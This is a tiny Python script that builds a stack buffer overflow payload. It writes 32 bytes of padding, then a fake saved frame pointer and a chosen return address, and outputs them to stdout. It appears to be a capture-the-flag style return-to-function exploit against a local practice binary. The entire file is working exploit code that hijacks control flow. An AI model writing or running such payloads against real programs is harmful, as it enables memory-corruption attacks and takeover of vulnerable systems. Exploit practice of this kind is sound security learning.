import sys
from struct import pack

buf = b'a'*0x20
buf += pack('<QQ', 0xdeadbeef, 0x4011f1)

sys.stdout.buffer.write(buf)
